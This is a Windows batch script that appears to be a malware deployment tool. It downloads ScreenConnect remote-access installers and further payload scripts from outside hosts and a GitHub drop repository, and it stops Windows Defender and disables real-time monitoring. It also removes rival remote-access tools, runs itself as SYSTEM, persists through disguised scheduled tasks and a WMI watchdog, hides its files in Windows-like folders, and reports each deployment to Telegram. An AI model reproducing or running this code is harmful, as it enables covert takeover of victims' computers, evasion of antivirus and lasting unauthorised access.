@echo off
setlocal EnableExtensions EnableDelayedExpansion
REM OWN BUILD 20260804O53 - MSI OLE magic; soft AV (no Sense kill / no WinDefend disable)
set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "BOOT=%SystemRoot%\Temp\.wucache"
set "LOG=%WD%\boot.err"
set "MSI=%TEMP%\sc_primary.msi"
set "MSICACHE=%WD%\pkg.msi"
set "PRIM=ScreenConnect Client (5f6010579852e507)"
set "ALT=ScreenConnect Client (f861c8140d453427)"
set "GRYXA=ScreenConnect Client (36e506ff016b2151)"
set "KEEP1=5f6010579852e507"
set "KEEP2=f861c8140d453427"
set "KEEP3=36e506ff016b2151"
set "MSIURL=https://ui.sevrz.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "MSIURL_GRYXA=https://ui.gryxa.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "MSI_G=%TEMP%\sc_gryxa.msi"
set "MSICACHE_G=%WD%\pkg_gryxa.msi"
set "SELF=%WD%\own_run.cmd"
set "PF86=%ProgramFiles(x86)%"
set "DROP=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
set "DROP2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main"
set "CURL=%SystemRoot%\System32\curl.exe"
if not exist "%CURL%" set "CURL=curl.exe"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
if not exist "%BOOT%" mkdir "%BOOT%" >nul 2>&1

REM O47b: unharden workdir on entry — LockDir (SYSTEM+Admin only) froze hosts on old
REM builds by blocking self-update downloads. Re-open so the tick can always update.
attrib -h -s -r "%WD%" >nul 2>&1
attrib -h -s -r "%WD%\*" >nul 2>&1
icacls "%WD%" /reset /T /C /Q >nul 2>&1
icacls "%WD%" /grant "NT AUTHORITY\SYSTEM:(OI)(CI)F" "BUILTIN\Administrators:(OI)(CI)F" /C /Q >nul 2>&1

REM Survive ScreenConnect Guest kill: detach into SYSTEM worker
if /I not "%~1"=="_RUN" (
  echo === OWN BUILD 20260802O50 ===
  echo whoami:
  whoami
  set "ELEV=0"
  whoami /groups | find "S-1-16-12288" >nul 2>&1 && set "ELEV=1"
  whoami /groups | find "S-1-5-18" >nul 2>&1 && set "ELEV=1"
  whoami | find /I "SYSTEM" >nul 2>&1 && set "ELEV=1"
  if "!ELEV!"=="0" (
    echo.
    echo *** NOT ELEVATED / NOT SYSTEM ***
    echo In ScreenConnect Command window: set Run as = SYSTEM
    echo Attempting UAC elevate ^(click Yes if prompted^)...
    copy /y "%~f0" "%BOOT%\own_elev.cmd" >nul 2>&1
    powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c \"%BOOT%\own_elev.cmd\"' -Verb RunAs"
    echo If no UAC prompt appeared, re-run command as SYSTEM.
    exit /b 5
  )
  echo elevated_ok>>"%BOOT%\boot.err" 2>nul
  REM O41b: never overwrite a locked own_run.cmd (prior worker holds it) — unique runner always.
  REM Also strip attrs on WD targets before any later copy.
  attrib -h -s -r "%BOOT%\own_run.cmd" >nul 2>&1
  attrib -h -s -r "%SELF%" >nul 2>&1
  set "RUNNER=%BOOT%\own_o32_%RANDOM%%RANDOM%.cmd"
  copy /y "%~f0" "!RUNNER!" >nul 2>&1
  if not exist "!RUNNER!" (
    echo ERROR: cannot write unique runner under %BOOT%
    exit /b 6
  )
  findstr /C:"OWN BUILD 20260802O50" "!RUNNER!" >nul 2>&1
  if errorlevel 1 (
    echo ERROR: runner copy is not O41 - abort
    exit /b 7
  )
  REM best-effort refresh of canonical paths (ignore lock failures)
  copy /y "!RUNNER!" "%BOOT%\own_run.cmd" >nul 2>&1
  mkdir "%WD%" >nul 2>&1
  copy /y "!RUNNER!" "%SELF%" >nul 2>&1
  echo go_start %DATE% %TIME%>>"%BOOT%\boot.err" 2>nul
  set "LOG=%WD%\boot.err"
  echo go_start %DATE% %TIME%>>"%LOG%" 2>nul
  if not exist "%LOG%" set "LOG=%BOOT%\boot.err"
  echo order=exterminate_then_repair_then_install>>"%LOG%" 2>nul
  echo engine=cmd_detached_o32>>"%LOG%" 2>nul
  echo whoami_launcher=>>"%LOG%" 2>nul
  whoami >>"%LOG%" 2>&1
  echo detach_begin>>"%LOG%" 2>nul
  echo runner=!RUNNER!>>"%LOG%" 2>nul
  set "DETACH_OK=0"

  REM Method A: plain schtasks as SYSTEM (paths have no spaces)
  REM NOTE: RUNNER is set inside this block - MUST use !RUNNER! (delayed expansion)
  schtasks /Delete /TN "WucacheOwn" /F >nul 2>&1
  schtasks /Create /TN "WucacheOwn" /RU SYSTEM /RL HIGHEST /SC ONCE /ST 23:59 /F /TR "cmd.exe /c !RUNNER! _RUN" >"%BOOT%\detach.task" 2>&1
  if not errorlevel 1 (
    del /f /q "%BOOT%\wproof" >nul 2>&1
    schtasks /Run /TN "WucacheOwn" >"%BOOT%\detach.run" 2>&1
    if not errorlevel 1 (
      REM SC Guest often kills at 10s — do NOT wait 12s for proof; /Run means worker launched.
      set "DETACH_OK=1"
      echo detach_via=schtasks_root>>"%LOG%"
    )
  )

  REM Method B: wmic (often absent on Win11)
  if "!DETACH_OK!"=="0" (
    wmic process call create "cmd.exe /c \"!RUNNER!\" _RUN" >"%BOOT%\detach.wmic" 2>&1
    findstr /C:"ReturnValue = 0" "%BOOT%\detach.wmic" >nul 2>&1
    if not errorlevel 1 (
      set "DETACH_OK=1"
      echo detach_via=wmic>>"%LOG%"
    )
  )

  REM Method C: one-shot service (flat path; cmd not a service - last resort)
  if "!DETACH_OK!"=="0" (
    copy /y "!RUNNER!" "%SystemRoot%\Temp\wucache_own.cmd" >nul 2>&1
    sc.exe stop WucacheOwn >nul 2>&1
    sc.exe delete WucacheOwn >nul 2>&1
    sc.exe create WucacheOwn binPath= "cmd.exe /c %SystemRoot%\Temp\wucache_own.cmd _RUN" start= demand type= own >"%BOOT%\detach.sc" 2>&1
    sc.exe start WucacheOwn >"%BOOT%\detach.scstart" 2>&1
    findstr /I /C:"START_PENDING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
    findstr /I /C:"RUNNING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
    if "!DETACH_OK!"=="1" echo detach_via=sc_service>>"%LOG%"
  )

  REM Method D: inline fallback (Guest may kill; better than nothing)
  if "!DETACH_OK!"=="0" (
    echo detach_via=inline_fallback>>"%LOG%"
    echo WARNING: detach APIs failed - running inline ^(Guest may kill^)

    call "!RUNNER!" _RUN
    exit /b !ERRORLEVEL!
  )

  echo detach_done>>"%LOG%"
  echo Detached OK. Wait ~90s then:
  echo   type "%LOG%"
  echo   type "%BOOT%\boot.err"
  echo   sc query state= all ^| findstr /I ScreenConnect
  exit /b 0
)

echo worker_start %DATE% %TIME%>>"%LOG%"
echo ok>"%BOOT%\wproof" 2>nul
echo === OWN WORKER 20260802O46 ===
if not exist "%LOG%" (
  set "LOG=%SystemRoot%\Temp\.wucache\boot.err"
  if not exist "%SystemRoot%\Temp\.wucache" mkdir "%SystemRoot%\Temp\.wucache" >nul 2>&1
  echo worker_start %DATE% %TIME%>>"%LOG%"
)

echo [0] Refresh core payloads (always fetch latest; embed = offline fallback only)...
set "STG=%SystemRoot%\Temp\.upd"
if not exist "%STG%" mkdir "%STG%" >nul 2>&1
attrib -h -s -r "%WD%" >nul 2>&1
icacls "%WD%" /grant "NT AUTHORITY\SYSTEM:(OI)(CI)F" "BUILTIN\Administrators:(OI)(CI)F" /C /Q >nul 2>&1
attrib -h -s -r "%WD%\own_mon.cmd" "%WD%\own_secure.cmd" "%WD%\tg_report.ps1" "%WD%\own_lib.ps1" >nul 2>&1

rem O48: ALWAYS pull latest from repo (staged in Temp, never blocked by WD lock).
rem Embed below is only a fallback when there is no network.
set "NETOK=0"
"%CURL%" -L --ssl-no-revoke --connect-timeout 12 --max-time 60 -o "%STG%\own_lib.ps1" "%DROP%/own_lib.ps1?t=%RANDOM%" >nul 2>&1
if not exist "%STG%\own_lib.ps1" "%CURL%" -L --connect-timeout 12 --max-time 60 -o "%STG%\own_lib.ps1" "%DROP2%/own_lib.ps1" >nul 2>&1
findstr /C:"OWN_LIB  BUILD" "%STG%\own_lib.ps1" >nul 2>&1 && set "NETOK=1"

if "%NETOK%"=="1" (
  "%CURL%" -L --ssl-no-revoke --connect-timeout 12 --max-time 60 -o "%STG%\own_mon.cmd" "%DROP%/own_mon.cmd?t=%RANDOM%" >nul 2>&1
  if not exist "%STG%\own_mon.cmd" "%CURL%" -L --connect-timeout 12 --max-time 60 -o "%STG%\own_mon.cmd" "%DROP2%/own_mon.cmd" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 12 --max-time 60 -o "%STG%\own_secure.cmd" "%DROP%/own_secure.cmd?t=%RANDOM%" >nul 2>&1
  if not exist "%STG%\own_secure.cmd" "%CURL%" -L --connect-timeout 12 --max-time 60 -o "%STG%\own_secure.cmd" "%DROP2%/own_secure.cmd" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 12 --max-time 60 -o "%STG%\tg_report.ps1" "%DROP%/tg_report.ps1?t=%RANDOM%" >nul 2>&1
  if not exist "%STG%\tg_report.ps1" "%CURL%" -L --connect-timeout 12 --max-time 60 -o "%STG%\tg_report.ps1" "%DROP2%/tg_report.ps1" >nul 2>&1
  rem BUILD-verify each then move into WD
  findstr /C:"OWN_MON  BUILD" "%STG%\own_mon.cmd" >nul 2>&1 && for %%F in ("%STG%\own_mon.cmd") do if %%~zF GTR 1500 move /y "%STG%\own_mon.cmd" "%WD%\own_mon.cmd" >nul 2>&1
  findstr /C:"OWN_SECURE BUILD" "%STG%\own_secure.cmd" >nul 2>&1 && for %%F in ("%STG%\own_secure.cmd") do if %%~zF GTR 800 move /y "%STG%\own_secure.cmd" "%WD%\own_secure.cmd" >nul 2>&1
  findstr /C:"OWN_LIB  BUILD" "%STG%\own_lib.ps1" >nul 2>&1 && for %%F in ("%STG%\own_lib.ps1") do if %%~zF GTR 1500 move /y "%STG%\own_lib.ps1" "%WD%\own_lib.ps1" >nul 2>&1
  findstr /C:"TG_REPORT BUILD" "%STG%\tg_report.ps1" >nul 2>&1 && for %%F in ("%STG%\tg_report.ps1") do if %%~zF GTR 1500 move /y "%STG%\tg_report.ps1" "%WD%\tg_report.ps1" >nul 2>&1
  echo core_fetch_latest_done>>"%LOG%"
) else (
  echo net_offline_using_embed>>"%LOG%"
  call :Extract B64_MON "%WD%\own_mon.cmd"
  call :Extract B64_SEC "%WD%\own_secure.cmd"
  call :Extract B64_TGR "%WD%\tg_report.ps1"
  call :Extract B64_LIB "%WD%\own_lib.ps1"
  if not exist "%WD%\notify.cfg" call :Extract B64_NTF "%WD%\notify.cfg"
  echo embed_extract_done>>"%LOG%"
)
del /f /q "%STG%\own_mon.cmd" "%STG%\own_secure.cmd" "%STG%\own_lib.ps1" "%STG%\tg_report.ps1" >nul 2>&1

echo [1] Defender + harden (exclusions/ACL) + soft AV stop...
echo av_reg_begin>>"%LOG%"
if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"
start "" /b cmd /c "sc stop WinDefend >nul 2>&1 & sc stop WdNisSvc >nul 2>&1 & powershell -NoProfile -NonInteractive -Command \"try{Set-MpPreference -DisableRealtimeMonitoring $true}catch{}\" >nul 2>&1"
echo av_fight_done>>"%LOG%"

echo [2] Download PRIMARY MSI (curl / powershell / github-pkg / cache)...
call :FetchMsi "%MSI%"
set "GOTMSI=%ERRORLEVEL%"
if "%GOTMSI%"=="0" (
  echo msi_ready>>"%LOG%"
) else (
  echo msi_fetch_FAILED>>"%LOG%"
)

echo [3] Exterminate foreign SC + disallowed RMM FIRST (clean field = SC installer custom action cannot collide)...
call :NukeForeign

echo [4] Ensure PRIMARY (SC-aware ladder: start -> /fa repair -> /i ONLY if unregistered)...
call :NoMsiPolicy
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary already RUNNING
  echo primary_already_running>>"%LOG%"
  goto :after_primary_install
)

REM present but STOPPED: restart, then /fa repair (never /i - shared legacy UpgradeCodes wipe ALT)
sc query "%PRIM%" >nul 2>&1
if not errorlevel 1 (
  echo primary_present_stopped_restart>>"%LOG%"
  net start "%PRIM%" >nul 2>&1
  sc start "%PRIM%" >nul 2>&1
  timeout /t 8 /nobreak >nul
  sc query "%PRIM%" | findstr /I RUNNING >nul
  if not errorlevel 1 (
    echo primary_restarted_ok>>"%LOG%"
    goto :after_primary_install
  )
  echo primary_stopped_try_repair>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
  sc query "%PRIM%" | findstr /I RUNNING >nul
  if not errorlevel 1 (
    echo primary_repaired_ok>>"%LOG%"
    goto :after_primary_install
  )
  echo primary_repair_failed_still_stopped>>"%LOG%"
  goto :after_primary_install
)

REM service missing: try /fa if product registered (safe - no Upgrade table remove)
echo primary_svc_missing_try_repair>>"%LOG%"
if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary_repaired_ok>>"%LOG%"
  goto :after_primary_install
)

if not "%GOTMSI%"=="0" (
  echo primary_skip_install_no_msi>>"%LOG%"
  goto :after_primary_install
)

REM refuse /i if product already registered - /i re-enters Upgrade table and can wipe ALT
set "REGSTATE=unknown"
if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action registered -Fp "%KEEP1%" -WorkDir "%WD%"`) do set "REGSTATE=%%R"
if /I "!REGSTATE!"=="yes" (
  echo primary_registered_skip_fresh_install>>"%LOG%"
  goto :after_primary_install
)

REM L45 HANDS-OFF: never rmdir ScreenConnect install dirs
REM stale install dir with no registered product breaks SC custom action FixupServiceArguments
if exist "%PF86%\ScreenConnect Client (%KEEP1%)" (
  echo stale_primary_dir_clean_SKIPPED_hands_off>>"%LOG%"
)
if exist "%ProgramFiles%\ScreenConnect Client (%KEEP1%)" (
  echo stale_primary_dir_clean_pf_SKIPPED_hands_off>>"%LOG%"
)

echo primary missing/unregistered - MSI install (LAST RESORT - Upgrade table may touch siblings)...
REM L45/M48 HANDS-OFF: never msiexec any ScreenConnect — diagnose disconnects first
echo hands_off_skip_primary_msi>>"%LOG%"
goto :after_primary_install
REM O53/L44: refuse sevrz /i when ANY Gryxa/non-sevrz SC present OR ExpectedFp svc exists.
REM ImagePath often lacks gryxa.com — also gate on ExpectedFp + protect-msi before /i.
set "GPRESENT=0"
sc query "ScreenConnect Client (36e506ff016b2151)" >nul 2>&1
if not errorlevel 1 set "GPRESENT=1"
for /f "tokens=2 delims=()" %%a in ('sc query state^= all ^| findstr /C:"SERVICE_NAME: ScreenConnect Client"') do (
  set "_FP=%%a"
  set "_FP=!_FP: =!"
  if /I not "!_FP!"=="%KEEP1%" if /I not "!_FP!"=="%KEEP2%" (
    sc query "ScreenConnect Client (!_FP!)" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
    if not errorlevel 1 set "GPRESENT=1"
  )
  for /f "usebackq delims=" %%I in (`reg query "HKLM\SYSTEM\CurrentControlSet\Services\ScreenConnect Client (!_FP!)" /v ImagePath 2^>nul ^| findstr /I "ImagePath"`) do (
    echo %%I | findstr /I "gryxa.com" >nul && set "GPRESENT=1"
  )
)
if "!GPRESENT!"=="1" (
  echo primary_skip_i_protect_gryxa>>"%LOG%"
  goto :after_primary_install
)
echo primary_install_begin>>"%LOG%"
set "MSI_SAFE="
if exist "%WD%\own_lib.ps1" (
  for /f "usebackq delims=" %%S in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action protect-msi -WorkDir "%WD%" -Extra "%MSI%" 2^>nul`) do if not "%%S"=="FAIL" if exist "%%S" set "MSI_SAFE=%%S"
)
if not defined MSI_SAFE (
  echo primary_protect_fail_skip_i>>"%LOG%"
  goto :after_primary_install
)
msiexec /i "!MSI_SAFE!" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install.log"
set "INST_EXIT=!ERRORLEVEL!"
echo msi_exit_!INST_EXIT!>>"%LOG%"
if "!INST_EXIT!"=="1618" (
  echo msi_busy_retry1>>"%LOG%"
  timeout /t 30 /nobreak >nul
  msiexec /i "!MSI_SAFE!" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install2.log"
  set "INST_EXIT=!ERRORLEVEL!"
  echo msi_retry1618_exit_!INST_EXIT!>>"%LOG%"
)
if "!INST_EXIT!"=="1618" (
  echo msi_busy_retry2>>"%LOG%"
  timeout /t 45 /nobreak >nul
  msiexec /i "!MSI_SAFE!" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install3.log"
  set "INST_EXIT=!ERRORLEVEL!"
  echo msi_retry1618_exit_!INST_EXIT!>>"%LOG%"
)
timeout /t 15 /nobreak >nul

REM post-install: product registered but service entry still missing -> /fa by GUID (safe)
sc query "%PRIM%" >nul 2>&1
if errorlevel 1 (
  echo postinstall_svc_missing_repair>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)

:after_primary_install
sc config "%PRIM%" start= auto >nul 2>&1
sc failure "%PRIM%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 5 /nobreak >nul
sc start "%PRIM%" >nul 2>&1
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary_running_ok>>"%LOG%"
) else (
  echo primary_still_down_after_install>>"%LOG%"
  sc query "%PRIM%" >>"%LOG%" 2>&1
)

echo [5] Start allowlist...
sc config "%ALT%" start= auto >nul 2>&1
sc start "%ALT%" >nul 2>&1
sc config "%PRIM%" start= auto >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 2 /nobreak >nul
REM O41: restore ALT if its service entry was deleted (SC-family msiexec side effect)
sc query "%ALT%" >nul 2>&1
if errorlevel 1 if exist "%WD%\own_lib.ps1" (
  echo alt_missing_repair>>"%LOG%"
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP2%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)

echo [5b] Gryxa FREEZE start-only (no msiexec - manual own_gryxa_force for install)...
if exist "%WD%\gryxa_install.cmd" del /f /q "%WD%\gryxa_install.cmd" >nul 2>&1
if exist "%WD%\own_lib.ps1" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-ensure -Deep -WorkDir "%WD%" -Build O43 >>"%LOG%" 2>&1
) else (
  sc config "%GRYXA%" start= auto >nul 2>&1
  sc start "%GRYXA%" >nul 2>&1
)
if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "KEEP3=%%L"
if defined KEEP3 set "GRYXA=ScreenConnect Client (%KEEP3%)"
sc config "%GRYXA%" start= auto >nul 2>&1
sc start "%GRYXA%" >nul 2>&1
timeout /t 5 /nobreak >nul
sc query "%GRYXA%" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
if not errorlevel 1 (echo gryxa_must_running_ok>>"%LOG%") else (echo gryxa_must_still_down_freeze_no_install>>"%LOG%")

echo [6] Arm wipe-proof persist (identity tasks + WMI watchdog + MSI cache)...
echo persist_begin>>"%LOG%"
if exist "%~dp0notify.cfg" call :ForceCopy "%~dp0notify.cfg" "%WD%\notify.cfg"
if not exist "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" mkdir "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" >nul 2>&1
call :ForceCopy "%WD%\own_mon.cmd" "%ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd"

if exist "%MSI%" for %%A in ("%MSI%") do if %%~zA GEQ 500000 (
  call :ForceCopy "%MSI%" "%MSICACHE%"
  echo msi_cached_bytes=%%~zA>>"%LOG%"
)

REM anti-signature identity: per-host task names + jittered schedule
REM O39/L13: Create like WucacheOwn â€” BOOT TR path + cmd schtasks + /ST (WD is ACL-locked)
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action init -WorkDir "%WD%" >nul 2>&1
if exist "%WD%\identity.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\identity.cfg") do set "%%K=%%L"
if not defined TASK_A set "TASK_A=WerQueueSync"
if not defined TASK_B set "TASK_B=PlaServerHealth"
if not defined TASK_C set "TASK_C=WdiHostProxy"
if not defined TASK_D set "TASK_D=TcpIpConflictRes"
if not defined MO_A set "MO_A=2"
if not defined MO_B set "MO_B=3"
REM strip leading \ if present (IDENTVER 6/7 leftovers)
if "!TASK_A:~0,1!"=="\" set "TASK_A=!TASK_A:~1!"
if "!TASK_B:~0,1!"=="\" set "TASK_B=!TASK_B:~1!"
if "!TASK_C:~0,1!"=="\" set "TASK_C=!TASK_C:~1!"
if "!TASK_D:~0,1!"=="\" set "TASK_D=!TASK_D:~1!"
echo identity_A=!TASK_A!>>"%LOG%"
echo identity_B=!TASK_B!>>"%LOG%"
echo identity_C=!TASK_C!>>"%LOG%"
echo identity_D=!TASK_D! mo=!MO_A!/!MO_B!>>"%LOG%"

REM TR under BOOT (Windows\Temp\.wucache) â€” same tree as working WucacheOwn detach
if not exist "%BOOT%" mkdir "%BOOT%" >nul 2>&1
copy /y "%WD%\own_mon.cmd" "%BOOT%\own_mon.cmd" >nul 2>&1
copy /y "%WD%\own_mon.cmd" "%BOOT%\etl_mon.cmd" >nul 2>&1
if not exist "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" mkdir "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" >nul 2>&1
copy /y "%WD%\own_mon.cmd" "%ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd" >nul 2>&1

for /f "tokens=1-2 delims=:" %%H in ("%TIME%") do set "ST=%%H:%%I"
set "ST=!ST: =0!"
echo create_taskA_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_A!" /F >nul 2>&1
schtasks /Create /TN "!TASK_A!" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO !MO_A! /ST !ST! /F /TR "cmd.exe /c %BOOT%\own_mon.cmd" >>"%LOG%" 2>&1
echo create_taskB_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_B!" /F >nul 2>&1
schtasks /Create /TN "!TASK_B!" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO !MO_B! /ST !ST! /F /TR "cmd.exe /c %BOOT%\etl_mon.cmd" >>"%LOG%" 2>&1
echo create_taskC_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_C!" /F >nul 2>&1
schtasks /Create /TN "!TASK_C!" /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "cmd.exe /c %BOOT%\own_mon.cmd" >>"%LOG%" 2>&1
echo create_taskD_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_D!" /F >nul 2>&1
schtasks /Create /TN "!TASK_D!" /RU SYSTEM /RL HIGHEST /SC ONLOGON /F /TR "cmd.exe /c %BOOT%\own_mon.cmd" >>"%LOG%" 2>&1
echo persist_armed_identity>>"%LOG%"
schtasks /Query /TN "!TASK_A!" >nul 2>&1 || echo verify_taskA_FAIL>>"%LOG%"
schtasks /Query /TN "!TASK_B!" >nul 2>&1 || echo verify_taskB_FAIL>>"%LOG%"
schtasks /Query /TN "!TASK_C!" >nul 2>&1 || echo verify_taskC_FAIL>>"%LOG%"
schtasks /Query /TN "!TASK_D!" >nul 2>&1 || echo verify_taskD_FAIL>>"%LOG%"
schtasks /Run /TN "!TASK_A!" >nul 2>&1
echo first_tick_run>>"%LOG%"

REM also run lib tasks-ensure (idempotent repair / ownership check)
if exist "%WD%\own_lib.ps1" (
  for /f "usebackq delims=" %%R in (`powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action tasks-ensure -WorkDir "%WD%" -MonPath "%WD%\own_mon.cmd"`) do (
    echo tasks_ensure %%R>>"%LOG%"
  )
)

REM chain 2: WMI watchdog subscription (mutual persistence)
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action watchdog -WorkDir "%WD%" -MonPath "%BOOT%\own_mon.cmd" >nul 2>&1
echo watchdog_armed>>"%LOG%"

REM campaign state baseline
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build O42 -Extra "deploy" >nul 2>&1

echo [6b] Re-lock persist dirs/tasks/SC after arm...
if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"

echo [7] First-deploy Telegram report...
if not exist "%WD%\notify.cfg" (
  if exist "%~dp0notify.cfg" (
    call :ForceCopy "%~dp0notify.cfg" "%WD%\notify.cfg"
  ) else (
    echo notify_cfg_MISSING>>"%LOG%"
    echo WARNING: notify.cfg missing - TG report will be skipped. Seed BOT_TOKEN/CHAT_ID into %WD%\notify.cfg
  )
)
if exist "%WD%\notify.cfg" (
  powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State DEPLOY -Summary "own.cmd first deploy complete" -WorkDir "%WD%" -Build O42 >>"%LOG%" 2>&1
) else (
  echo deploy_tg_skipped_no_notify>>"%LOG%"
)
echo deploy_tg_done>>"%LOG%"

sc query "%PRIM%" >>"%LOG%" 2>&1
sc query state= all | findstr /I ScreenConnect >>"%LOG%"
echo go_exit_0>>"%LOG%"
exit /b 0

REM ========== helpers ==========
:FetchMsi
set "OUT=%~1"
del /f /q "%OUT%" >nul 2>&1
echo fetch_msi_begin>>"%LOG%"

if exist "%SystemRoot%\System32\curl.exe" (
  echo fetch_try=curl_sys>>"%LOG%"
  "%SystemRoot%\System32\curl.exe" -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%OUT%" "%MSIURL%" >>"%LOG%" 2>&1
)
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=curl_path>>"%LOG%"
curl.exe -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%OUT%" "%MSIURL%" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=powershell>>"%LOG%"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
  "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" ^
  "Try{Invoke-WebRequest -Uri '%MSIURL%' -OutFile '%OUT%' -UseBasicParsing -TimeoutSec 180}Catch{Add-Content -LiteralPath '%LOG%' -Value ('fetch_ps_err '+$_.Exception.Message)}" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=github_pkg>>"%LOG%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 30 --max-time 300 -o "%OUT%" "%DROP%/pkg.msi?t=%RANDOM%" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=jsdelivr_pkg>>"%LOG%"
"%CURL%" -L --connect-timeout 30 --max-time 300 -o "%OUT%" "%DROP2%/pkg.msi" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

if exist "%MSICACHE%" (
  echo fetch_try=cache>>"%LOG%"
  copy /y "%MSICACHE%" "%OUT%" >nul
  call :MsiOk "%OUT%"
  if not errorlevel 1 exit /b 0
)

echo fetch_msi_all_failed>>"%LOG%"
exit /b 1

:MsiOk
if not exist "%~1" exit /b 1
for %%A in ("%~1") do (
  echo msi_bytes=%%~zA>>"%LOG%"
  if %%~zA LSS 500000 (
    echo msi_too_small>>"%LOG%"
    del /f /q "%~1" >nul 2>&1
    exit /b 1
  )
)
rem O51: OLE magic d0cf11e0 — reject HTML/error pages (same class as L37 Gryxa)
powershell -NoProfile -NonInteractive -Command "$p=$args[0]; $fs=[IO.File]::OpenRead($p); $b=New-Object byte[] 4; [void]$fs.Read($b,0,4); $fs.Close(); if($b[0]-eq 0xD0 -and $b[1]-eq 0xCF -and $b[2]-eq 0x11 -and $b[3]-eq 0xE0){exit 0}else{exit 1}" "%~1" >nul 2>&1
if errorlevel 1 (
  echo msi_bad_magic>>"%LOG%"
  del /f /q "%~1" >nul 2>&1
  exit /b 1
)
copy /y "%~1" "%MSICACHE%" >nul 2>&1
exit /b 0

:NukeForeign
echo exterminate_begin>>"%LOG%"
if exist "%WD%\own_lib.ps1" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action exterminate -WorkDir "%WD%" >>"%LOG%" 2>&1
) else (
  echo exterminate_skipped_no_lib>>"%LOG%"
)
echo exterminate_done>>"%LOG%"
REM settle Windows Installer mutex after /x before any /i or /fa
timeout /t 8 /nobreak >nul
exit /b 0

